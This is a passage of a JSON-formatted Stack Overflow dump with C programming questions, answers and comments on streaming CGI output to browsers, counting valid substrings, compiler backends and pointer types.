"comment_id": 76815204, "body": "I&#39;ll explain the situation in an answer. BTW, you should add the formatted raw response to your question, it&#39;s relevant to your problem."}, {"owner": {"reputation": 208003, "user_id": 841108, "user_type": "registered", "accept_rate": 61, "profile_image": "https://i.stack.imgur.com/Fm52y.png?s=128&g=1", "display_name": "Basile Starynkevitch", "link": "https://stackoverflow.com/users/841108/basile-starynkevitch"}, "edited": false, "score": 0, "creation_date": 1499240352, "post_id": 44919221, "comment_id": 76815442, "body": "Looks strongly like an <a href=\"http://xyproblem.info/\" rel=\"nofollow noreferrer\">XY problem</a> or like some musunderstanding about HTTP. Please <b>edit your question</b> to motivate it and explain the overall goal"}, {"owner": {"reputation": 18509, "user_id": 939410, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/bb161e6bf2e1dded07d3fd921f487334?s=128&d=identicon&r=PG", "display_name": "Art", "link": "https://stackoverflow.com/users/939410/art"}, "edited": false, "score": 1, "creation_date": 1499240369, "post_id": 44919221, "comment_id": 76815456, "body": "HTTP is not an interactive protocol. CGI is not an interactive protocol. In general when you make a HTTP request the only thing everyone is worried about is that you get all your data, not that it is reproduced at the same pace as your CGI script produces it."}, {"owner": {"reputation": 208003, "user_id": 841108, "user_type": "registered", "accept_rate": 61, "profile_image": "https://i.stack.imgur.com/Fm52y.png?s=128&g=1", "display_name": "Basile Starynkevitch", "link": "https://stackoverflow.com/users/841108/basile-starynkevitch"}, "edited": false, "score": 0, "creation_date": 1499240633, "post_id": 44919221, "comment_id": 76815627, "body": "@DeepImagination: your understanding of HTTP is very wrong. Take a few days to read more about it. You can find entire books dedicated to HTTP protocol"}, {"owner": {"reputation": 208003, "user_id": 841108, "user_type": "registered", "accept_rate": 61, "profile_image": "https://i.stack.imgur.com/Fm52y.png?s=128&g=1", "display_name": "Basile Starynkevitch", "link": "https://stackoverflow.com/users/841108/basile-starynkevitch"}, "edited": false, "score": 0, "creation_date": 1499240747, "post_id": 44919221, "comment_id": 76815695, "body": "Without additional explanation and motivation, your question is not clear enough"}, {"owner": {"user_type": "does_not_exist", "display_name": "user2371524"}, "edited": false, "score": 1, "creation_date": 1499240995, "post_id": 44919221, "comment_id": 76815861, "body": "@DeepImagination this <i>should</i> work with chunked transfer encoding, see my answer. But your idea of monitoring the logfile is very bad. Use some notification mechanism to know when the file was modified, e.g. <a href=\"http://man7.org/linux/man-pages/man7/inotify.7.html\" rel=\"nofollow noreferrer\"><code>inotify</code></a> if this is on Linux."}, {"owner": {"user_type": "does_not_exist", "display_name": "user2371524"}, "edited": false, "score": 1, "creation_date": 1499241069, "post_id": 44919221, "comment_id": 76815914, "body": "@DeepImagination another problem you will run into is that CGI scripts are normally restricted to a maximum running duration. You might want to use a library for creating your own HTTP service."}, {"owner": {"reputation": 208003, "user_id": 841108, "user_type": "registered", "accept_rate": 61, "profile_image": "https://i.stack.imgur.com/Fm52y.png?s=128&g=1", "display_name": "Basile Starynkevitch", "link": "https://stackoverflow.com/users/841108/basile-starynkevitch"}, "edited": false, "score": 0, "creation_date": 1499241159, "post_id": 44919221, "comment_id": 76815982, "body": "@DeepImagination: please <b>edit your question</b> don&#39;t comment it"}], "answers": [{"comments": [{"owner": {"user_type": "does_not_exist", "display_name": "user2371524"}, "edited": false, "score": 0, "creation_date": 1499241363, "post_id": 44919792, "comment_id": 76816136, "body": "I think your response is a bit overkill, and there&#39;s already a shift away from (pure) SPAs btw, as Javascript will always be unreliable. Big players like Amazon only use it optionally. For the simple usecase of the OP, I&#39;d definitely go with chunked transfer encoding, just not with CGI of course, so I very much agree with you on using a library for an HTTP service."}, {"owner": {"reputation": 208003, "user_id": 841108, "user_type": "registered", "accept_rate": 61, "profile_image": "https://i.stack.imgur.com/Fm52y.png?s=128&g=1", "display_name": "Basile Starynkevitch", "link": "https://stackoverflow.com/users/841108/basile-starynkevitch"}, "edited": false, "score": 0, "creation_date": 1499241599, "post_id": 44919792, "comment_id": 76816300, "body": "On the other hand most &quot;interactive&quot; web apps (think of chatting application) do use both AJAX &amp; WebSocket"}, {"owner": {"user_type": "does_not_exist", "display_name": "user2371524"}, "edited": false, "score": 0, "creation_date": 1499241758, "post_id": 44919792, "comment_id": 76816397, "body": "If it&#39;s &quot;mission critical&quot;, there&#39;s always a fallback, and there&#39;s a school of thought for web applications (I forgot its catchy name) to start out with the minimum technical requirements (like, make it work in lynx ;) ) and add features as they&#39;re detected."}, {"owner": {"reputation": 208003, "user_id": 841108, "user_type": "registered", "accept_rate": 61, "profile_image": "https://i.stack.imgur.com/Fm52y.png?s=128&g=1", "display_name": "Basile Starynkevitch", "link": "https://stackoverflow.com/users/841108/basile-starynkevitch"}, "edited": false, "score": 0, "creation_date": 1499242187, "post_id": 44919792, "comment_id": 76816691, "body": "He did not really explain what he wants. Indeed, he is monitoring some log file"}, {"owner": {"reputation": 208003, "user_id": 841108, "user_type": "registered", "accept_rate": 61, "profile_image": "https://i.stack.imgur.com/Fm52y.png?s=128&g=1", "display_name": "Basile Starynkevitch", "link": "https://stackoverflow.com/users/841108/basile-starynkevitch"}, "edited": false, "score": 0, "creation_date": 1499242274, "post_id": 44919792, "comment_id": 76816746, "body": "@DeepImagination: But HTTP is not an interactive protocol, and it is <i>client</i> (that is <i>browser</i>) initiated (with each HTTP request done by the browser expecting a single HTTP response in reasonable time). To send <i>asynchronous</i> messages from the server side, you need more (AJAX + WebSockets)"}, {"owner": {"user_type": "does_not_exist", "display_name": "user2371524"}, "edited": false, "score": 1, "creation_date": 1499242308, "post_id": 44919792, "comment_id": 76816764, "body": "@DeepImagination as delays in a CGI script are a <b>bad</b> idea for virtually <b>any</b> CGI script, the question could use some explanation. The way it is now, it&#39;s not helpful for future readers."}, {"owner": {"user_type": "does_not_exist", "display_name": "user2371524"}, "edited": false, "score": 0, "creation_date": 1499242543, "post_id": 44919792, "comment_id": 76816897, "body": "@DeepImagination the most basic solution is described in my answer. It&#39;s been there for a <b>long</b> time, but isn&#39;t used quite often. It might suffer from lost connections, but it&#39;s the only solution working without client-side code."}, {"owner": {"user_type": "does_not_exist", "display_name": "user2371524"}, "edited": false, "score": 1, "creation_date": 1499242577, "post_id": 44919792, "comment_id": 76816923, "body": "@DeepImagination curl is NOT a webbrowser but a tool meant also for debugging web services, so it just displays what it receives. It&#39;s just not the way a webbrowser works!"}], "tags": [], "owner": {"reputation": 208003, "user_id": 841108, "user_type": "registered", "accept_rate": 61, "profile_image": "https://i.stack.imgur.com/Fm52y.png?s=128&g=1", "display_name": "Basile Starynkevitch", "link": "https://stackoverflow.com/users/841108/basile-starynkevitch"}, "is_accepted": false, "score": 1, "last_activity_date": 1499245980, "last_edit_date": 1499245980, "creation_date": 1499240142, "answer_id": 44919792, "question_id": 44919221, "link": "https://stackoverflow.com/questions/44919221/sleep1-fflushstdout-works-via-curl-not-via-web-browser/44919792#44919792", "title": "sleep(1) + fflush(stdout) works via curl. NOT via web browser", "body": "<p><strong><a href=\"https://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol\" rel=\"nofollow noreferrer\">HTTP</a> is much more complex</strong> than what you believe, and CGI is obsolete (with HTML5 &amp; AJAX applications). Consider using some <strong>HTTP server library like <a href=\"http://coralbits.com/libonion/\" rel=\"nofollow noreferrer\">libonion</a></strong> (or make a <a href=\"https://en.wikipedia.org/wiki/FastCGI\" rel=\"nofollow noreferrer\">FastCGI</a> application...) and/or some <strong>HTTP client library like <a href=\"https://curl.haxx.se/libcurl/\" rel=\"nofollow noreferrer\">libcurl</a></strong>.</p>\n\n<p>To make your thing work without any library (which IMHO is a mistake) you need to study more HTTP and add <a href=\"https://en.wikipedia.org/wiki/List_of_HTTP_header_fields\" rel=\"nofollow noreferrer\">more headers in your HTTP request</a>, notably <code>Host:</code>, and in the response: <code>Content-Length:</code>, <code>Connection: close</code></p>\n\n<p>I strongly recommend not coding all your HTTP protocol handling by yourself (so <strong>use an HTTP library</strong>).</p>\n\n<blockquote>\n  <p>what can be done to ensure the web browser behaves like curl ?</p>\n</blockquote>\n\n<p>Nothing can be done; a browser is entitled to handle only <em>complete</em> HTTP messages, and there are good reasons for that. In addition, most browsers would open <em>several connections</em> (simultaneously) to the <em>same</em> HTTP service.</p>\n\n<p>If you need an apparently interactive behavior of a modern browser (that is a browser window which evolves visually with time), you should consider using techniques like <a href=\"https://en.wikipedia.org/wiki/Ajax_(programming)\" rel=\"nofollow noreferrer\">AJAX</a> (with <a href=\"https://en.wikipedia.org/wiki/HTML5\" rel=\"nofollow noreferrer\">HTML5</a>) &amp; <a href=\"https://en.wikipedia.org/wiki/WebSocket\" rel=\"nofollow noreferrer\">WebSockets</a>, so program the browser using JavaScript (which might be generated on the server side). Read also about <a href=\"https://en.wikipedia.org/wiki/Single-page_application\" rel=\"nofollow noreferrer\">single-page applications</a>. Look into the <a href=\"https://github.com/davidmoreno/onion/blob/master/examples/websockets/websockets.c\" rel=\"nofollow noreferrer\">websocket example of libonion</a> (it probably is quite relevant for your needs). BTW such a WebSockets &amp; AJAX &amp; HTML5 based approach has (over the <a href=\"https://stackoverflow.com/a/44919926/841108\">answer provided by Felix Palmen</a>) the advantage to enable some more visually fancy thing (e.g. counting and displaying line numbers), and also (with some extra Javascript code) to add the ability to clear the shown log lines (on the browser side only).</p>\n\n<p>BTW, on Linux specifically (with a local file system like <code>ext4</code>) you may want to use <a href=\"http://man7.org/linux/man-pages/man7/inotify.7.html\" rel=\"nofollow noreferrer\">inotify(7)</a> facilities to be notified of a file change. You'll want some <a href=\"https://en.wikipedia.org/wiki/Event_loop\" rel=\"nofollow noreferrer\">event loop</a> around <a href=\"http://man7.org/linux/man-pages/man2/poll.2.html\" rel=\"nofollow noreferrer\">poll(2)</a> (or the older <a href=\"http://man7.org/linux/man-pages/man2/select.2.html\" rel=\"nofollow noreferrer\">select(2)</a> ...), but most HTTP related libraries provide one.</p>\n\n<p>It is important to understand that <strong>HTTP is <em>not</em> an interactive protocol</strong> (every request is browser initiated and gets exactly one response). To add interactivity (flowing to the server) you need more (e.g. WebSockets, which provides <em>asynchronous</em> messages from server to browser), or at least some \"semi-busy polling\" that is periodic Javascript (in the browser) doing AJAX requests.</p>\n"}, {"comments": [{"owner": {"reputation": 208003, "user_id": 841108, "user_type": "registered", "accept_rate": 61, "profile_image": "https://i.stack.imgur.com/Fm52y.png?s=128&g=1", "display_name": "Basile Starynkevitch", "link": "https://stackoverflow.com/users/841108/basile-starynkevitch"}, "edited": false, "score": 0, "creation_date": 1499243804, "post_id": 44919926, "comment_id": 76817726, "body": "I don&#39;t think that the chunked transfer approach would work in general. Consider the following case: the logged file on the server side stays unchanged for a long time (e.g. a few minutes). then the corresponding HTTP request would stay blocked (for a few minutes also). And the browser won&#39;t be happy (because of a timeout). I really think that for the OP&#39;s problem WebSockets are required (hence also HTML5 &amp; AJAX) or at least some kind of &quot;semi-busy&quot; periodic polling in Javascript in the browser"}, {"owner": {"user_type": "does_not_exist", "display_name": "user2371524"}, "reply_to_user": {"reputation": 208003, "user_id": 841108, "user_type": "registered", "accept_rate": 61, "profile_image": "https://i.stack.imgur.com/Fm52y.png?s=128&g=1", "display_name": "Basile Starynkevitch", "link": "https://stackoverflow.com/users/841108/basile-starynkevitch"}, "edited": false, "score": 0, "creation_date": 1499244076, "post_id": 44919926, "comment_id": 76817912, "body": "@BasileStarynkevitch it works, I even used it for a simple chat application in the past, long before Websockets were available. Browsers don&#39;t just close the connection on chunked transfer, no matter how long they have to wait. The only problem is a lost connection, requiring a manual reload or some client-side code detecting this (like <i>long polling</i>) (Well, the other is a CGI timeout, but that&#39;s not directly related to chunked transfer encoding)"}], "tags": [], "owner": {"user_type": "does_not_exist", "display_name": "user2371524"}, "is_accepted": false, "score": 2, "last_activity_date": 1499244767, "last_edit_date": 1499244767, "creation_date": 1499240529, "answer_id": 44919926, "question_id": 44919221, "link": "https://stackoverflow.com/questions/44919221/sleep1-fflushstdout-works-via-curl-not-via-web-browser/44919926#44919926", "title": "sleep(1) + fflush(stdout) works via curl. NOT via web browser", "body": "<p>HTTP is originally designed to deliver a document. It has a header describing the document and the document itself follows in the body, normally all in one piece.</p>\n\n<p>One of the headers is <code>Content-Length:</code>, containing the size of the body, so the client knows how much data to expect. A browser will typically attempt do fetch the whole document before starting to display it. As in your example, there's no <code>Content-Length:</code>, the browser just waits until the connection is closed.</p>\n\n<p>Of course, setting <code>Content-Length:</code> will <strong>not</strong> help you here, the browser would still wait for the whole document. But there's also <a href=\"https://en.wikipedia.org/wiki/Chunked_transfer_encoding\" rel=\"nofollow noreferrer\">chunked transfer encoding</a> for delivering a document in several pieces. You could implement it yourself, e.g. like this:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n\nint main(){\n    char buffer[1024];\n\n    // note that \"Content-Type\" has an uppercase T, be exact when\n    // implementing a protocol!\n    printf(\"Content-Type: text/plain\\n\");\n    printf(\"Transfer-Encoding: chunked\\n\\n\");    \n\n    // snprintf() just for demonstration, you might need it for output\n    // of anything more complex than just fixed strings.\n    snprintf(buffer, 1024, \"%s\", \"test 1\");\n\n    // size of next chunk:\n    printf(\"%zx\\n\", strlen(buffer));\n\n    printf(\"%s\\n\", buffer);\n\n    fflush(stdout);\n    sleep(1); // or something more sensible, like, actual work...\n\n    // more data, finally indicate this was the last chunk:\n    printf(\"\\n\");\n\n    return 0;\n}\n</code></pre>\n\n<hr>\n\n<p>Some notes on the feasibility of this solution:</p>\n\n<ul>\n<li><p>With CGI, as shown here, there's normally a limit on the running duration of the \"script\". It might be possible to configure the webserver without a time limit, otherwise this will just run into a CGI timeout. A better solution is to write this as a self-hosted web service, see <a href=\"https://stackoverflow.com/a/44919792/2371524\">Basile's answer</a> for some links.</p></li>\n<li><p>The nice thing about this approach is that it doesn't require client-side code, so it will work with nearly any browser (chunked transfer support is very common). The downside is you might loose the TCP connection due to some environmental condition and the only way to recover is to manually reload the page. Therefore you <em>might</em> want to use javascript <strong>if available</strong> and go for WebSockets (preferable, see Basile's answer) or, if not available, perform <a href=\"https://www.pubnub.com/blog/2014-12-01-http-long-polling/\" rel=\"nofollow noreferrer\">long polling</a>.</p></li>\n</ul>\n"}], "owner": {"user_type": "does_not_exist", "display_name": "user8256800"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 111, "favorite_count": 0, "answer_count": 2, "score": -4, "last_activity_date": 1499270600, "creation_date": 1499238502, "last_edit_date": 1499270600, "question_id": 44919221, "link": "https://stackoverflow.com/questions/44919221/sleep1-fflushstdout-works-via-curl-not-via-web-browser", "title": "sleep(1) + fflush(stdout) works via curl. NOT via web browser", "body": "<p>the pauses (<code>sleep(1)</code>), work fine when script is ran via curl command<br>\nrather than run on a web browser.</p>\n\n<p>but via web browser.. it will pause the sum of all pauses (3 x <code>sleep(1)</code>) and then  print them all at once<br></p>\n\n<p>what can be done to ensure the web browser behaves like curl ?</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;unistd.h&gt;\n\nint main() {\n    printf(\"Content-type: text/plain\\n\\n\");\n\n    printf(\"%s\\n\", \"test 1\");\n    fflush(stdout);\n\n    sleep(1);\n\n    printf(\"%s\\n\", \"test 2\");\n    fflush(stdout);\n\n    sleep(1);\n\n    printf(\"%s\\n\", \"test 3\");\n    fflush(stdout);\n\n    sleep(1);\n\n    printf(\"%s\\n\", \"test 4\");\n    fflush(stdout);\n\n    return 0;\n}\n</code></pre>\n"}, {"tags": ["c", "string", "algorithm", "substring"], "comments": [{"owner": {"reputation": 1186, "user_id": 2290983, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/646ee78276bd8adeb3d512c92a226ec8?s=128&d=identicon&r=PG&f=1", "display_name": "Amit Kumar", "link": "https://stackoverflow.com/users/2290983/amit-kumar"}, "edited": false, "score": 0, "creation_date": 1499238349, "post_id": 44919099, "comment_id": 76814141, "body": "Why not find all the possibe substrings and check if it fits the asked criterion ?"}, {"owner": {"reputation": 4082, "user_id": 7893951, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/5eWm1.jpg?s=128&g=1", "display_name": "Akira", "link": "https://stackoverflow.com/users/7893951/akira"}, "edited": false, "score": 1, "creation_date": 1499238389, "post_id": 44919099, "comment_id": 76814159, "body": "Welcome to StackOverflow! <b>We are not a code writing service.</b> Please show us what you have tried, and detail what the problem is. Also, learn <a href=\"https://stackoverflow.com/help/how-to-ask\">how to ask</a> good questions for more tips."}, {"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "reply_to_user": {"reputation": 4082, "user_id": 7893951, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/5eWm1.jpg?s=128&g=1", "display_name": "Akira", "link": "https://stackoverflow.com/users/7893951/akira"}, "edited": false, "score": 0, "creation_date": 1499243723, "post_id": 44919099, "comment_id": 76817679, "body": "@Akira The question is asking for an algorithm/pseudo-code, which is fine. That someone still decided to post the full C code is no fault of the OP."}, {"owner": {"reputation": 4082, "user_id": 7893951, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/5eWm1.jpg?s=128&g=1", "display_name": "Akira", "link": "https://stackoverflow.com/users/7893951/akira"}, "reply_to_user": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 0, "creation_date": 1499244477, "post_id": 44919099, "comment_id": 76818199, "body": "@Lundin, in this case, I seem to misunderstand the OP&#39;s question."}, {"owner": {"reputation": 94553, "user_id": 775806, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/XNd2C.png?s=128&g=1", "display_name": "n. &#39;pronouns&#39; m.", "link": "https://stackoverflow.com/users/775806/n-pronouns-m"}, "edited": false, "score": 0, "creation_date": 1499246891, "post_id": 44919099, "comment_id": 76820038, "body": "Perhaps you could more easily calculate the number of invalid substrings, then subtract it from the number of all substrings."}, {"owner": {"reputation": 11, "user_id": 8106260, "user_type": "registered", "profile_image": "https://graph.facebook.com/1421991161227380/picture?type=large", "display_name": "Garvit", "link": "https://stackoverflow.com/users/8106260/garvit"}, "reply_to_user": {"reputation": 1186, "user_id": 2290983, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/646ee78276bd8adeb3d512c92a226ec8?s=128&d=identicon&r=PG&f=1", "display_name": "Amit Kumar", "link": "https://stackoverflow.com/users/2290983/amit-kumar"}, "edited": false, "score": 0, "creation_date": 1499251271, "post_id": 44919099, "comment_id": 76823292, "body": "How to check is a sub string fits the asked criterion? That&#39;s what I&#39;m asking. @AmitKumar"}], "answers": [{"comments": [{"owner": {"reputation": 11, "user_id": 8106260, "user_type": "registered", "profile_image": "https://graph.facebook.com/1421991161227380/picture?type=large", "display_name": "Garvit", "link": "https://stackoverflow.com/users/8106260/garvit"}, "edited": false, "score": 0, "creation_date": 1499273186, "post_id": 44919375, "comment_id": 76839541, "body": "Just one more doubt @amit. How do we calculate D[0], D[1] - - - - , D[6] in this?"}], "tags": [], "owner": {"reputation": 165886, "user_id": 572670, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/5011cf6d98e276b1bdc2cb321546e528?s=128&d=identicon&r=PG", "display_name": "amit", "link": "https://stackoverflow.com/users/572670/amit"}, "is_accepted": false, "score": 3, "last_activity_date": 1499238951, "creation_date": 1499238951, "answer_id": 44919375, "question_id": 44919099, "link": "https://stackoverflow.com/questions/44919099/number-of-valid-sub-string-algorithm/44919375#44919375", "title": "Number of valid sub-string algorithm", "body": "<p>Define <code>D[i]</code> - number of valid substrings ending at index <code>i</code>.</p>\n\n<p>Assuming you have this <code>D[i]</code>, the solution is simply <code>D[0]+D[1]+...+D[n-1]</code>.</p>\n\n<p>Calculating <code>D</code> is fairly simple, by iterating the string and for each charater:</p>\n\n<ul>\n<li>if it is \"valid\", all substrings ending with this characters are valid.</li>\n<li>Otherwise, only by extending a valid substring that ended at last character - makes it valid.</li>\n</ul>\n\n<p>C code:</p>\n\n<pre><code>int NumValidSubstrings(char* s) {\n  int n = strlen(s);\n  int D[n] = {0};  // VLA, if that's an issue, just use dynamic allocation\n  for (int i = 0; i &lt; n; i++) { \n    if (s[i] == 'z' || s[i] == 'a') {\n      // if character is valid, each substring ending with it is also valid.\n      D[i] += i + 1;\n    } else if (i &gt; 0) {\n      // Else, only valid substrings from last character, that are extended by 1\n      D[i] = D[i-1];\n    }\n  }\n  int count = 0;\n  for (int i = 0; i &lt; n; i++) count += D[i];\n  return count;\n}\n</code></pre>\n\n<p>Notes:</p>\n\n<ol>\n<li>This technique is called <a href=\"https://en.wikipedia.org/wiki/Dynamic_programming\" rel=\"nofollow noreferrer\">Dynamic Programming</a>.</li>\n<li>This solution is <code>O(n)</code> time + space.</li>\n<li>You can save some space by not storing the entire <code>D</code> array - but only the last value and calculate <code>count</code> on the fly, making this solution <code>O(1)</code> space  and <code>O(n)</code> time.</li>\n</ol>\n"}], "owner": {"reputation": 11, "user_id": 8106260, "user_type": "registered", "profile_image": "https://graph.facebook.com/1421991161227380/picture?type=large", "display_name": "Garvit", "link": "https://stackoverflow.com/users/8106260/garvit"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 90, "favorite_count": 0, "answer_count": 1, "score": -1, "last_activity_date": 1499246353, "creation_date": 1499238119, "last_edit_date": 1499246353, "question_id": 44919099, "link": "https://stackoverflow.com/questions/44919099/number-of-valid-sub-string-algorithm", "title": "Number of valid sub-string algorithm", "body": "<p>I came across a question for which I couldn't find the algorithm. Can you help me?\nQuestion- A valid substring is one which contains the letter <code>a</code> or <code>z</code>. You will get a string and you have to calculate the number of valid sub-strings of that string.For example- the string '<code>abcd</code>' contains 4 valid substrings. The string '<code>azazaz</code>' contains 21 valid substrings and similarly '<code>abbzbba</code>' contains 22 valid substrings.\nI just want to know the algorithm.</p>\n"}, {"tags": ["c++", "c", "compiler-construction", "systems-programming", "intermediate-code"], "comments": [{"owner": {"reputation": 7421, "user_id": 6782754, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/99008d0e4c4c15ab03d77938ad9e345b?s=128&d=identicon&r=PG", "display_name": "Gerhardh", "link": "https://stackoverflow.com/users/6782754/gerhardh"}, "edited": false, "score": 0, "creation_date": 1499238530, "post_id": 44919087, "comment_id": 76814237, "body": "Are you talking about the host where the compiler is running or the host where the compiled binary is running on later?"}, {"owner": {"reputation": 7421, "user_id": 6782754, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/99008d0e4c4c15ab03d77938ad9e345b?s=128&d=identicon&r=PG", "display_name": "Gerhardh", "link": "https://stackoverflow.com/users/6782754/gerhardh"}, "edited": false, "score": 0, "creation_date": 1499242743, "post_id": 44919087, "comment_id": 76817032, "body": "Thanks for clarification. If you were asking about the compil<b>ed</b> binary, it would go in a different direction."}], "answers": [{"comments": [{"owner": {"reputation": 3514, "user_id": 2612002, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/b5a04.png?s=128&g=1", "display_name": "iehrlich", "link": "https://stackoverflow.com/users/2612002/iehrlich"}, "edited": false, "score": 2, "creation_date": 1499239411, "post_id": 44919152, "comment_id": 76814790, "body": "Well, rather three parts, as the major part of the backend is machine-independent as well - it&#39;d be a hell otherwise."}], "tags": [], "owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "is_accepted": true, "score": 7, "last_activity_date": 1499238258, "creation_date": 1499238258, "answer_id": 44919152, "question_id": 44919087, "link": "https://stackoverflow.com/questions/44919087/how-does-a-compiler-identify-its-host-machines-hardware-which-component/44919152#44919152", "title": "How does a compiler identify its host machine&#39;s hardware? Which component?", "body": "<p>Normally a compiler is divided into two parts: A frontend that does the parsing, and which generates intermediate code. Then a backend which takes the intermediate code and generate the assembly or machine code.</p>\n\n<p>The frontend can be generic, but the backend is built for a specific <em>target</em>. So the compiler doesn't have to \"identify\" the host, only know the target.</p>\n\n<p>Note that host and target may be different systems, which is used for <a href=\"https://en.wikipedia.org/wiki/Cross_compiler\" rel=\"noreferrer\"><em>cross compilation</em></a>.</p>\n"}], "owner": {"reputation": 51, "user_id": 7237154, "user_type": "registered", "profile_image": "https://graph.facebook.com/1347091821999647/picture?type=large", "display_name": "Vivek Sharma", "link": "https://stackoverflow.com/users/7237154/vivek-sharma"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 113, "favorite_count": 0, "accepted_answer_id": 44919152, "answer_count": 1, "score": 3, "last_activity_date": 1499238258, "creation_date": 1499238062, "question_id": 44919087, "link": "https://stackoverflow.com/questions/44919087/how-does-a-compiler-identify-its-host-machines-hardware-which-component", "title": "How does a compiler identify its host machine&#39;s hardware? Which component?", "body": "<p>My teacher told me that the intermediate code is generic for all systems but a component of the compiler then make it different according the system/environment the code is run on. Can someone please explain it.</p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 852, "user_id": 1917004, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/e12a0abb82fac3b2293597967a7ec90d?s=128&d=identicon&r=PG", "display_name": "ctrl-shift-esc", "link": "https://stackoverflow.com/users/1917004/ctrl-shift-esc"}, "edited": false, "score": 1, "creation_date": 1499237907, "post_id": 44918988, "comment_id": 76813875, "body": "A pointer can point to anything. Things go wrong when you&#39;re trying to read from &quot;meaningful&quot; data from the said pointer. If you try to cast a <code>List</code> pointer to a <code>Node</code> pointer, you&#39;ll definitely get some compiler warnings."}, {"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1499237908, "post_id": 44918988, "comment_id": 76813876, "body": "It can&#39;t, not really. Why do you think that? Can you please elaborate on what confuses you?"}, {"owner": {"reputation": 32078, "user_id": 7860670, "user_type": "registered", "accept_rate": 60, "profile_image": "https://i.stack.imgur.com/LH36y.png?s=128&g=1", "display_name": "user7860670", "link": "https://stackoverflow.com/users/7860670/user7860670"}, "edited": false, "score": 5, "creation_date": 1499237975, "post_id": 44918988, "comment_id": 76813914, "body": "In your code snippet <code>plist</code> is not used at all."}, {"owner": {"reputation": 290304, "user_id": 187690, "user_type": "registered", "accept_rate": 59, "profile_image": "https://www.gravatar.com/avatar/89a4da7af5bf1558b7d2704309f1f118?s=128&d=identicon&r=PG", "display_name": "AnT", "link": "https://stackoverflow.com/users/187690/ant"}, "edited": false, "score": 1, "creation_date": 1499238026, "post_id": 44918988, "comment_id": 76813948, "body": "Nowhere in the code you posted <code>plist</code> is made to point to anything at all. What in this code made you believe that <code>plist</code> can also point to <code>Node</code>???"}, {"owner": {"reputation": 112, "user_id": 6747018, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/7390f145d007c59399030173f9de4632?s=128&d=identicon&r=PG&f=1", "display_name": "innerpeace", "link": "https://stackoverflow.com/users/6747018/innerpeace"}, "edited": false, "score": 0, "creation_date": 1499239537, "post_id": 44918988, "comment_id": 76814877, "body": "sorry, I forget part of the code block, the pointer conversion is in function <code>ListItemCount</code>"}, {"owner": {"reputation": 32078, "user_id": 7860670, "user_type": "registered", "accept_rate": 60, "profile_image": "https://i.stack.imgur.com/LH36y.png?s=128&g=1", "display_name": "user7860670", "link": "https://stackoverflow.com/users/7860670/user7860670"}, "edited": false, "score": 1, "creation_date": 1499241217, "post_id": 44918988, "comment_id": 76816035, "body": "Have you tried compiling this code? I bet it didn&#39;t compile like this."}, {"owner": {"reputation": 112, "user_id": 6747018, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/7390f145d007c59399030173f9de4632?s=128&d=identicon&r=PG&f=1", "display_name": "innerpeace", "link": "https://stackoverflow.com/users/6747018/innerpeace"}, "edited": false, "score": 0, "creation_date": 1499241548, "post_id": 44918988, "comment_id": 76816262, "body": "The compiler throw: <code>error: incompatible types when initializing type \u2018Node *</code>, sorry,\u3000I should compile by myself instead of just reading books!"}, {"owner": {"reputation": 3797, "user_id": 4022608, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/27c9e8430426724a1f39c98b268f0a98?s=128&d=identicon&r=PG&f=1", "display_name": "Baldrickk", "link": "https://stackoverflow.com/users/4022608/baldrickk"}, "edited": false, "score": 0, "creation_date": 1499241696, "post_id": 44918988, "comment_id": 76816357, "body": "@innerpeace well there you are then. It can&#39;t"}], "answers": [{"tags": [], "owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "is_accepted": false, "score": 1, "last_activity_date": 1499241494, "creation_date": 1499241494, "answer_id": 44920255, "question_id": 44918988, "link": "https://stackoverflow.com/questions/44918988/why-a-pointer-to-list-can-also-point-to-node/44920255#44920255", "title": "why a pointer to List can also point to Node?", "body": "<p>The compiler should shout warnings at you for that code.</p>\n\n<p>However 